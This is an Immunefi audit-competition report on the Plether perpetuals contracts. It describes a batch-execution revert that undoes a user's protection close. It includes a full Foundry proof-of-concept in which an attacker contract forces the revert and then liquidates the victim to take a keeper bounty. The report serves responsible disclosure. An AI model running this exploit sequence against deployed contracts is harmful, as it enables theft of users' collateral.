# \#100095 [SC-Medium] Retained-basket coverage keyed to the newest component time can revert valid batch reuse and enables liquidation-bounty theft

**Submitted on Nov 16th 2026 at 08:17:09 UTC by @OxVrka for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100095
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

During batch execution, reuse of a retained historical basket requires every configured feed’s stored publish time to reach the basket’s newest component time; when a divergent payload has just advanced its lagging feeds to their older component times, those stored observations sit below that requirement, and the resulting revert escapes the per-item rollback boundary, undoing a protection close that completed earlier within the batch transaction. The victim’s position remains open and exposed to later liquidation.

## Vulnerability Details

The batch prepares the next item's oracle data before entering the per-item external call and its catch boundary:

```solidity
(
    OrderV3Types.PendingReason oracleStopReason,
    OracleResult memory oracleResult,
    IPletherOracle.BatchOrderPriceCache memory nextCache
) = _prepareBatchOracle(host, orderView.order, pythUpdateData, state);
state.oracleCache = nextCache;
// Oracle-stop handling, request construction, and gas checks occur here.
try host.executeOrderItemFromSidecar{gas: executionGas}(executionRequest) returns (
    OrderV3Types.ExecutionResult memory executionResult
) {
    if (executionResult.status == OrderV3Types.LifecycleStatus.Pending) {
        batchResult.stopReason = executionResult.pendingReason;
        break;
    }
    ++batchResult.terminalCount;
} catch (bytes memory revertData) {
    batchResult.stopReason = _pendingReasonForRevert(revertData);
    break;
}
```

When a retained basket is reused (a documented, accepted path), no new update or parse runs; the oracle checks every configured feed’s stored observation against the cache’s recorded publish time:

```solidity
if (!policy.oracleFrozen && _canReuseHistoricalBatchBasket(request.commitTime, cache)) {
    // Cache contents are caller-supplied; independently prove storage coverage, not price authenticity.
    for (uint256 i; i < pythFeedIds.length; ++i) {
        _requireStoredFeedCoverage(pythFeedIds[i], cache.publishTime);
    }
```

If a stored feed is older than the required publish time, the coverage check reverts:

```solidity
if (storedPublishTime < requiredPublishTime) {
    revert PletherOracle__StoredFeedBehind(feedId, storedPublishTime, requiredPublishTime);
}
```

The basket computation — not the Pyth parse — accepts component divergence and records `publishTime = max(component publish times)`, and the preparation’s `updatePriceFeeds` only advances each feed’s stored time — so when the lagging feeds’ storage was still below their payload times, the update leaves them stored below the cached newest-component time the reuse check demands.

`_prepareBatchOracle` rethrows this error; only historical-parser failures are converted to an item result:

```solidity
} catch (bytes memory reason) {
    if (
        reason.length != 68
            || _selector(reason) != IPletherOracle.PletherOracle__HistoricalParserFailure.selector
    ) {
        assembly ("memory-safe") {
            revert(add(reason, 32), mload(reason))
        }
    }
    return (OrderV3Types.PendingReason.OracleFailure, result, state.oracleCache);
}
```

The complete-batch revert itself is documented atomicity; the defect is that the coverage rule fails for a divergent cache whenever the lagging feeds’ stored observations have not advanced past the newest component time, so a later item reusing that cache reverts the batch and undoes a protection close that completed earlier within the batch transaction. Cache preparation must remain inside the item boundary or reject a retained basket that cannot prove coverage for every feed.

## Impact Details

A coverage check that fails while the lagging feeds’ storage sits below the cached newest component time can roll back a protection close completed earlier within the batch transaction. The victim’s position remains open and exposed to further market losses.

The outer revert restores the position, protection, and queue state, so a close that executed earlier does not persist. Later adverse prices can make the position liquidatable and deplete the victim’s reserved collateral through the public liquidation path.

An ordinary keeper can trigger the issue through the public batch entrypoint when a retained basket lacks stored-feed coverage for a later item. The protection close rides the global FIFO, so the victim neither submitted nor can influence the batch that revoked it; bounding maxOrderId is available only to the batch submitter. The PoC demonstrates direct theft of the liquidation bounty from the victim’s reserve.

## References
- [Reviewed repository commit](https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8)
- [Public batch execution entrypoint](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L256)
- [Batch loop and per-item execution boundary](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L235-L326)
- [Cache-preparation revert path](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L982-L1037)
- [Retained-basket coverage against the cache's newest component time](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L262-L266) · [coverage predicate](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L645-L658)
- [Basket time set to the newest component under the accepted divergence](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L848-L874)
- [Latched-only owner amendment](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L327)
- [Public protection continuation](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L405)
- [In-flight protection status](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L564-L578)
- [Close attempt queued from durable limits](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L657-L680)
- [Public liquidation route](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L493-L500)
- [Release deployment settings](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/script/DeployPerpsArbitrumSepolia.s.sol#L68-L130)


## Link to Proof of Concept

https://gist.github.com/0xVrka/2e3471f283b50bd7a6843996ed178091

## Proof of Concept

## Proof of Concept
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdEngineAdmin} from "@plether/perps/CfdEngineAdmin.sol";
import {CfdEngineLens} from "@plether/perps/CfdEngineLens.sol";
import {CfdEnginePlanner} from "@plether/perps/CfdEnginePlanner.sol";
import {CfdEngineSettlementSidecar} from "@plether/perps/CfdEngineSettlementSidecar.sol";
import {CfdOrderPolicyEvaluator} from "@plether/perps/CfdOrderPolicyEvaluator.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {HousePoolRedemptionMathSidecar} from "@plether/perps/HousePoolRedemptionMathSidecar.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderRouterExecutionSidecar} from "@plether/perps/OrderRouterExecutionSidecar.sol";
import {OrderRouterLiquidationBatchSidecar} from "@plether/perps/OrderRouterLiquidationBatchSidecar.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {MockSettlementToken} from "../utils/MockSettlementToken.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

/// @dev Release-only constructor wrappers copied verbatim from script/DeployPerpsArbitrumSepolia.s.sol
///      so the test is self-contained against the package's own import roots.
contract ArbitrumSepoliaReleaseHousePool is HousePool {

    constructor(
        address settlementToken,
        address engine,
        address redemptionMathSidecar
    ) HousePool(settlementToken, engine, redemptionMathSidecar) {
        poolConfig.maxSeniorExposureAssets = 40_000_000e6;
        poolConfig.maxSeniorShareBps = 8000;
        _validatePoolConfig(poolConfig);
    }

}

/// @dev Release-only constructor wrapper for the oracle-backed Router confidence policy. Subsequent policy changes
///      still flow exclusively through the existing RouterAdmin 72-hour proposal/finalization path.
contract ArbitrumSepoliaReleaseOracle is PletherOracle {

    constructor(
        address engine,
        address housePool,
        address pyth,
        bytes32[] memory feedIds,
        uint256[] memory quantities,
        uint256[] memory basePrices,
        bool[] memory inversions
    ) PletherOracle(engine, housePool, pyth, feedIds, quantities, basePrices, inversions) {
        adverseConfidenceMultiplierBps = 2500;
    }

}

/// @dev Release-only constructor wrapper for the Router opening minimum. It also fail-closes on the paired oracle's
///      constructor-initialized adverse-confidence multiplier. Later Router changes retain the standard admin delay.
contract ArbitrumSepoliaReleaseRouter is OrderRouter {

    constructor(
        address engine,
        address engineLens,
        address housePool,
        address pletherOracle_,
        address keeperSidecar,
        address policyEvaluator,
        address executionSidecar,
        address lifecycleBook
    )
        OrderRouter(
            engine,
            engineLens,
            housePool,
            pletherOracle_,
            keeperSidecar,
            policyEvaluator,
            executionSidecar,
            lifecycleBook
        )
    {
        minOpenNotionalAssets = 1000e6;
    }

}

/// @dev Ordinary, permissionless trader/keeper calls bundled by one attacker-controlled account.
contract OrdinaryKeeperActor {

    OrderRouter internal immutable router;
    IPositionProtectionActions internal immutable protectionActions;
    IERC20 internal immutable settlementToken;
    MarginClearinghouse internal immutable clearinghouse;

    constructor(
        OrderRouter router_,
        address protectionBook_,
        IERC20 settlementToken_,
        MarginClearinghouse clearinghouse_
    ) {
        router = router_;
        protectionActions = IPositionProtectionActions(protectionBook_);
        settlementToken = settlementToken_;
        clearinghouse = clearinghouse_;
    }

    function deposit(uint256 assets) external {
        settlementToken.approve(address(clearinghouse), assets);
        clearinghouse.deposit(address(this), assets);
    }

    function expireRetryAndQueue(
        uint64 expiredProtectionOrderId,
        uint64 protectionId,
        OrderV3Types.OrderRequest calldata secondOrder
    ) external returns (uint64 retryId, uint64 secondOrderId) {
        router.expireOrder(expiredProtectionOrderId);
        retryId = protectionActions.retryPositionProtectionClose(protectionId);
        secondOrderId = router.commitOrder(secondOrder);
    }

    function executeBatch(
        uint64 maxOrderId,
        bytes[] calldata pythUpdateData
    ) external payable returns (OrderV3Types.BatchResult memory result) {
        return router.executeOrderBatch{value: msg.value}(maxOrderId, pythUpdateData);
    }

    function expirePairAndRetry(
        uint64 firstOrderId,
        uint64 secondOrderId,
        uint64 protectionId
    ) external returns (uint64 retryId) {
        router.expireOrder(firstOrderId);
        router.expireOrder(secondOrderId);
        retryId = protectionActions.retryPositionProtectionClose(protectionId);
    }


    function executeThenRetry(
        uint64 failedOrderId,
        uint64 protectionId,
        bytes[] calldata pythUpdateData
    ) external returns (OrderV3Types.ExecutionResult memory result, uint64 retryId) {
        result = router.executeOrder(failedOrderId, pythUpdateData);
        protectionActions.retryPositionProtectionClose(protectionId);
        retryId = router.nextCommitId() - 1;
    }


    function liquidate(
        address account,
        bytes[] calldata pythUpdateData
    ) external payable {
        router.executeLiquidation{value: msg.value}(account, pythUpdateData);
    }
}

contract RetainedBasketCoverageTest is Test {

    uint256 internal constant START_TIME = 1_709_532_000;
    uint256 internal constant INITIAL_MARK = 100_000_000;
    uint256 internal constant TRIGGER_MARK = 100_150_000;
    uint256 internal constant P1_MARK = 100_300_000;
    uint256 internal constant P2_MARK = 101_200_000;
    uint256 internal constant POSITION_SIZE = 10_000_000e18;
    uint256 internal constant POSITION_MARGIN = 100_000e6;
    uint256 internal constant VICTIM_DEPOSIT = 120_000e6;
    uint256 internal constant LP_ASSETS = 60_000_000e6;
    uint256 internal constant ATTACKER_DEPOSIT = 100e6;

    address internal constant VICTIM = address(0xA11CE);
    address internal constant TRIGGER_KEEPER = address(0xB0B);
    uint32 internal constant CAP_PRICE = 2e8;

    bytes32 internal constant PYTH_EUR_USD = 0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b;
    bytes32 internal constant PYTH_USD_JPY = 0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52;
    bytes32 internal constant PYTH_GBP_USD = 0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1;
    bytes32 internal constant PYTH_USD_CAD = 0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca;
    bytes32 internal constant PYTH_USD_SEK = 0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676;
    bytes32 internal constant PYTH_USD_CHF = 0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8;

    MockSettlementToken internal settlementToken;
    MockPyth internal pyth;
    MarginClearinghouse internal clearinghouse;
    CfdEngine internal engine;
    CfdEngineLens internal engineLens;
    ArbitrumSepoliaReleaseHousePool internal pool;
    TrancheVault internal seniorVault;
    TrancheVault internal juniorVault;
    ArbitrumSepoliaReleaseRouter internal router;
    OrderLifecycleBook internal lifecycleBook;
    IPositionProtectionActions internal protectionActions;
    IPositionProtectionViews internal protectionViews;
    OrdinaryKeeperActor internal attacker;

    uint64 internal protectionId;
    uint64 internal initialProtectionOrderId;
    uint64 internal triggerTime;
    uint64 internal fixtureTime;

    function setUp() public {
        _warpTo(START_TIME);

        settlementToken = new MockSettlementToken();
        clearinghouse = new MarginClearinghouse(address(settlementToken));
        engine = new CfdEngine(address(settlementToken), address(clearinghouse), CAP_PRICE, _riskParams(), 50);
        TerminalNavBookV2 terminalBook = new TerminalNavBookV2(address(engine), CAP_PRICE);
        engine.setTerminalNavBook(address(terminalBook));

        CfdEnginePlanner planner = new CfdEnginePlanner();
        CfdEngineSettlementSidecar settlement = new CfdEngineSettlementSidecar(address(engine));
        CfdEngineAdmin engineAdmin = new CfdEngineAdmin(address(engine), address(this));
        engine.setDependencies(address(planner), address(settlement), address(engineAdmin));

        engineLens = new CfdEngineLens(address(engine));
        HousePoolRedemptionMathSidecar poolMath = new HousePoolRedemptionMathSidecar();
        pool = new ArbitrumSepoliaReleaseHousePool(address(settlementToken), address(engine), address(poolMath));
        seniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), true, "Plether Senior LP", "psLP", 0, address(0)
        );
        juniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), false, "Plether Junior LP", "pjLP", 0, address(this)
        );
        pool.setSeniorVault(address(seniorVault));
        pool.setJuniorVault(address(juniorVault));
        engine.setPool(address(pool));

        pyth = new MockPyth();
        ArbitrumSepoliaReleaseOracle oracle = new ArbitrumSepoliaReleaseOracle(
            address(engine),
            address(pool),
            address(pyth),
            _feedIds(),
            _feedWeights(),
            _feedBases(),
            _feedInversions()
        );
        CfdOrderPolicyEvaluator evaluator = new CfdOrderPolicyEvaluator();
        OrderRouterExecutionSidecar execution = new OrderRouterExecutionSidecar();

        address predictedRouter = vm.computeCreateAddress(address(this), vm.getNonce(address(this)) + 2);
        lifecycleBook = new OrderLifecycleBook(
            predictedRouter, address(engine), address(clearinghouse), address(pool)
        );
        OrderRouterLiquidationBatchSidecar liquidation = new OrderRouterLiquidationBatchSidecar(predictedRouter);
        router = new ArbitrumSepoliaReleaseRouter(
            address(engine),
            address(engineLens),
            address(pool),
            address(oracle),
            address(liquidation),
            address(evaluator),
            address(execution),
            address(lifecycleBook)
        );
        assertEq(address(router), predictedRouter);
        engine.setOrderRouter(address(router));
        clearinghouse.setEngine(address(engine));
        protectionActions = IPositionProtectionActions(router.positionProtectionBook());
        protectionViews = IPositionProtectionViews(router.positionProtectionBook());

        settlementToken.mint(address(this), 2e6);
        settlementToken.approve(address(pool), 2e6);
        pool.initializeSeedPosition(false, 1e6, address(this));
        pool.initializeSeedPosition(true, 1e6, address(this));
        pool.activateTrading();

        settlementToken.mint(address(this), LP_ASSETS);
        settlementToken.approve(address(juniorVault), LP_ASSETS);
        uint256 depositId = juniorVault.requestDeposit(LP_ASSETS, address(this), address(this));
        _warpTo(juniorVault.depositEpochStart(depositId));
        pool.settleLpEpoch(0, 0);
        juniorVault.claimDeposit(depositId, LP_ASSETS, address(this), address(this));

        _warpTo(fixtureTime + 1);
        router.updateMarkPrice(_uniformData(INITIAL_MARK, fixtureTime, engine.lastMarkTime()));
        _openVictimPosition();
        _createAndTriggerProtection();

        attacker = new OrdinaryKeeperActor(
            OrderRouter(address(router)),
            address(router.positionProtectionBook()),
            IERC20(address(settlementToken)),
            clearinghouse
        );
        settlementToken.mint(address(attacker), ATTACKER_DEPOSIT);
        attacker.deposit(ATTACKER_DEPOSIT);

        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6);
        assertEq(pool.maxSeniorShareBps(), 8000);
        assertEq(router.minOpenNotionalAssets(), 1000e6);
        assertEq(oracle.adverseConfidenceMultiplierBps(), 2500);
        assertEq(router.maxExecutionWindowSeconds(), 60);
        assertEq(engine.CAP_PRICE(), CAP_PRICE);
        assertApproxEqAbs(engine.lastMarkPrice(), TRIGGER_MARK, 1);
    }

    function test_LaggingFeedCoverageRevertUnwindsProtectionCloseIntoLiquidationBounty() public {
        uint256 victimBefore = clearinghouse.balanceAssets(VICTIM);
        uint256 attackerBefore = clearinghouse.balanceAssets(address(attacker));
        uint256 totalAttackGas;

        uint256 gasBefore = gasleft();
        (uint64 firstRetryId, uint64 attackerOrderId) = _expireRetryAndQueueAttackerOrder();
        totalAttackGas += gasBefore - gasleft();

        uint256 firstRetryCommitTime = fixtureTime;
        bytes[] memory mixedP0 = _mixedTimeData(
            TRIGGER_MARK, firstRetryCommitTime, uint64(triggerTime)
        );
        _warpTo(firstRetryCommitTime + 3);
        gasBefore = gasleft();
        vm.expectPartialRevert(IPletherOracle.PletherOracle__StoredFeedBehind.selector);
        attacker.executeBatch(attackerOrderId, mixedP0);
        totalAttackGas += gasBefore - gasleft();

        assertEq(router.nextExecuteId(), firstRetryId);
        assertEq(clearinghouse.balanceAssets(VICTIM), victimBefore);
        assertEq(clearinghouse.balanceAssets(address(attacker)), attackerBefore);
        (uint256 liveSize,,,,,,) = engine.positions(VICTIM);
        assertEq(liveSize, POSITION_SIZE);

        uint256 firstRetryDeadline = firstRetryCommitTime + router.maxExecutionWindowSeconds();
        _warpTo(firstRetryDeadline + 1);
        gasBefore = gasleft();
        uint64 secondRetryId = attacker.expirePairAndRetry(
            firstRetryId, attackerOrderId, protectionId
        );
        totalAttackGas += gasBefore - gasleft();
        uint256 secondRetryCommitTime = fixtureTime;

        bytes[] memory p1Data = _uniformData(
            P1_MARK, uint64(secondRetryCommitTime + 1), uint64(triggerTime)
        );
        _warpTo(secondRetryCommitTime + 2);
        ICfdEngineTypes.LiquidationPreview memory p1Preview = engineLens.previewLiquidation(VICTIM, P1_MARK);
        assertFalse(p1Preview.liquidatable, "p1 must remain within solvent close range");

        gasBefore = gasleft();
        (OrderV3Types.ExecutionResult memory failedResult, uint64 liveRetryId) =
            attacker.executeThenRetry(secondRetryId, protectionId, p1Data);
        totalAttackGas += gasBefore - gasleft();
        assertEq(uint8(failedResult.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(liveRetryId, router.nextCommitId() - 1);
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered)
        );

        uint256 p2 = P2_MARK;
        ICfdEngineTypes.LiquidationPreview memory liquidationPreview = engineLens.previewLiquidation(VICTIM, p2);
        for (uint256 i; !liquidationPreview.liquidatable && i < 16; ++i) {
            p2 += 100_000;
            liquidationPreview = engineLens.previewLiquidation(VICTIM, p2);
        }
        assertTrue(liquidationPreview.liquidatable, "p2 must cross the production liquidation threshold");
        assertLe(p2, 103_000_000, "price move must remain below 3 percent");

        bytes[] memory p2Data = _uniformData(
            p2, uint64(fixtureTime + 1), uint64(P1_MARKET_TIME(secondRetryCommitTime))
        );
        _warpTo(fixtureTime + 2);
        gasBefore = gasleft();
        attacker.liquidate(VICTIM, p2Data);
        totalAttackGas += gasBefore - gasleft();

        uint256 victimAfter = clearinghouse.balanceAssets(VICTIM);
        uint256 attackerAfter = clearinghouse.balanceAssets(address(attacker));
        uint256 victimDebit = victimBefore - victimAfter;
        uint256 attackerCredit = attackerAfter - attackerBefore;

        assertGt(victimDebit, 0);
        assertEq(victimDebit, 87_666_664_345, "exact victim settlement debit");
        assertEq(attackerCredit, liquidationPreview.keeperBountyAssets);
        assertEq(attackerCredit, 5_000e6, "exact liquidation keeper credit");
        assertEq(victimAfter, 19_999_600_000, "exact victim post-settlement balance");
        assertEq(victimAfter, liquidationPreview.settlementRetainedAssets);
        assertGt(attackerCredit, 0);
        (liveSize,,,,,,) = engine.positions(VICTIM);
        assertEq(liveSize, 0);

        uint256 conservativeGasCostAssets = totalAttackGas * 60;
        assertGt(attackerCredit, conservativeGasCostAssets * 10, "bounty must exceed conservative gas cost by 10x");
        console2.log("attacker_keeper_credit_assets", attackerCredit);
        console2.log("victim_balance_debit_assets", victimDebit);
        console2.log("victim_post_balance_assets", victimAfter);
        console2.log("total_attack_gas_units", totalAttackGas);
        console2.log("gas_cost_at_20gwei_and_3000usd_assets", conservativeGasCostAssets);
        console2.log("p2_liquidation_price", p2);
    }


    function _expireRetryAndQueueAttackerOrder() internal returns (uint64 retryId, uint64 attackerOrderId) {
        uint256 initialDeadline = uint256(triggerTime) + router.maxExecutionWindowSeconds();
        _warpTo(initialDeadline + 1);
        OrderV3Types.OrderRequest memory secondOrder = _attackerOrderRequest();
        (retryId, attackerOrderId) = attacker.expireRetryAndQueue(
            initialProtectionOrderId, protectionId, secondOrder
        );
    }


    function _openVictimPosition() internal {
        settlementToken.mint(VICTIM, VICTIM_DEPOSIT);
        vm.startPrank(VICTIM);
        settlementToken.approve(address(clearinghouse), VICTIM_DEPOSIT);
        clearinghouse.deposit(VICTIM, VICTIM_DEPOSIT);
        OrderV3Types.OrderRequest memory request = _victimOpenRequest();
        uint64 orderId = router.commitOrder(request);
        vm.stopPrank();

        uint256 commitTime = fixtureTime;
        // Pyth's order parser requires a publication strictly after commitTime.
        // Leave a second between the commit and execution so the fixture stays
        // valid even when the surrounding setup has just advanced one block.
        _warpTo(commitTime + 2);
        bytes[] memory openData = _uniformData(INITIAL_MARK, uint64(commitTime + 2), uint64(commitTime));
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, openData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        (uint256 size,,,,,,) = engine.positions(VICTIM);
        assertEq(size, POSITION_SIZE);

        // Order execution updates the engine mark but intentionally does not
        // advance the oracle's accepted live basket. Synchronize both before
        // position protection reads the latest live price.
        _warpTo(fixtureTime + 1);
        router.updateMarkPrice(
            _uniformData(INITIAL_MARK, fixtureTime, engine.lastMarkTime())
        );
    }

    function _createAndTriggerProtection() internal {
        PositionProtectionTypes.PositionProtectionParams memory params =
            PositionProtectionTypes.PositionProtectionParams({
                takeProfitTriggerPrice: 0,
                stopLossTriggerPrice: 100_100_000,
                closeLimits: PositionProtectionTypes.CloseFinancialLimits({
                    maxExecutionNotionalAssets: 10_020_000e6,
                    maxGrossAccountDebitAssets: type(uint256).max,
                    maxActionChargeAssets: type(uint256).max,
                    maxExplicitFeesAssets: type(uint256).max
                })
            });
        vm.prank(VICTIM);
        protectionId = protectionActions.createPositionProtection(params);

        _warpTo(fixtureTime + 1);
        triggerTime = fixtureTime;
        bytes[] memory triggerData = _uniformData(TRIGGER_MARK, triggerTime, engine.lastMarkTime());
        vm.prank(TRIGGER_KEEPER);
        initialProtectionOrderId = protectionActions.triggerPositionProtection(protectionId, triggerData);

        PositionProtectionTypes.PositionProtectionView memory protection =
            protectionViews.getPositionProtection(protectionId);
        assertEq(uint8(protection.status), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));
        assertEq(protection.linkedOrderId, initialProtectionOrderId);
    }

    function _victimOpenRequest() internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = keccak256("victim-long-open");
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = POSITION_SIZE;
        request.marginDelta = POSITION_MARGIN;
        request.targetPrice = INITIAL_MARK;
        request.isClose = false;
        request.bounds = _bounds(
            type(uint256).max,
            type(uint256).max,
            POSITION_SIZE,
            uint64(fixtureTime + router.maxExecutionWindowSeconds())
        );
    }

    function _attackerOrderRequest() internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = keccak256(abi.encode("attacker-batch-open", fixtureTime));
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = 1_000e18;
        request.marginDelta = 10e6;
        request.targetPrice = CAP_PRICE;
        request.isClose = false;
        request.bounds = _bounds(
            type(uint256).max,
            type(uint256).max,
            request.sizeDelta,
            uint64(fixtureTime + router.maxExecutionWindowSeconds())
        );
    }

    function _bounds(
        uint256 maxNotional,
        uint256 maxDebit,
        uint256 maxPostSize,
        uint64 submitBy
    ) internal view returns (OrderV3Types.ExecutionBounds memory bounds) {
        bounds = OrderV3Types.ExecutionBounds({
            submitBy: submitBy,
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 7,
            expectedConfigHash: lifecycleBook.currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: maxNotional,
            maxGrossAccountDebitAssets: maxDebit,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: maxPostSize,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _uniformData(
        uint256 targetPrice,
        uint64 publishTime,
        uint64 previousPublishTime
    ) internal pure returns (bytes[] memory updateData) {
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](6);
        bytes32[] memory feedIds = _feedIds();
        uint256[] memory bases = _feedBases();
        bool[] memory inversions = _feedInversions();
        for (uint256 i; i < updates.length; ++i) {
            updates[i] = MockPyth.FeedUpdate({
                id: feedIds[i],
                price: MockPyth.MockPrice({
                    price: int64(uint64(_rawFeedPrice(bases[i], targetPrice, inversions[i]))),
                    conf: 0,
                    expo: -8,
                    publishTime: publishTime,
                    prevPublishTime: previousPublishTime
                })
            });
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

    function _mixedTimeData(
        uint256 targetPrice,
        uint256 commitTime,
        uint64 previousPublishTime
    ) internal pure returns (bytes[] memory updateData) {
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](6);
        bytes32[] memory feedIds = _feedIds();
        uint256[] memory bases = _feedBases();
        bool[] memory inversions = _feedInversions();
        for (uint256 i; i < updates.length; ++i) {
            uint64 componentTime = uint64(commitTime + (i == 0 ? 1 : 2));
            updates[i] = MockPyth.FeedUpdate({
                id: feedIds[i],
                price: MockPyth.MockPrice({
                    price: int64(uint64(_rawFeedPrice(bases[i], targetPrice, inversions[i]))),
                    conf: 0,
                    expo: -8,
                    publishTime: componentTime,
                    prevPublishTime: previousPublishTime
                })
            });
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

    function _rawFeedPrice(
        uint256 basePrice,
        uint256 targetPrice,
        bool inverted
    ) internal pure returns (uint256) {
        if (!inverted) {
            return (basePrice * targetPrice) / 1e8;
        }
        uint256 denominator = basePrice * targetPrice;
        return (1e24 + denominator / 2) / denominator;
    }

    function _feedIds() internal pure returns (bytes32[] memory ids) {
        ids = new bytes32[](6);
        ids[0] = PYTH_EUR_USD;
        ids[1] = PYTH_USD_JPY;
        ids[2] = PYTH_GBP_USD;
        ids[3] = PYTH_USD_CAD;
        ids[4] = PYTH_USD_SEK;
        ids[5] = PYTH_USD_CHF;
    }

    function _feedWeights() internal pure returns (uint256[] memory weights) {
        weights = new uint256[](6);
        weights[0] = 576e15;
        weights[1] = 136e15;
        weights[2] = 119e15;
        weights[3] = 91e15;
        weights[4] = 42e15;
        weights[5] = 36e15;
    }

    function _feedBases() internal pure returns (uint256[] memory bases) {
        bases = new uint256[](6);
        bases[0] = 117_500_000;
        bases[1] = 638_000;
        bases[2] = 134_480_000;
        bases[3] = 72_880_000;
        bases[4] = 10_860_000;
        bases[5] = 126_100_000;
    }

    function _feedInversions() internal pure returns (bool[] memory inversions) {
        inversions = new bool[](6);
        inversions[1] = true;
        inversions[3] = true;
        inversions[4] = true;
        inversions[5] = true;
    }

    function _riskParams() internal pure returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _warpTo(
        uint256 timestamp
    ) internal {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(timestamp);
        fixtureTime = uint64(timestamp);
    }

    function P1_MARKET_TIME(
        uint256 retryCommitTime
    ) internal pure returns (uint64) {
        return uint64(retryCommitTime + 1);
    }
}

```

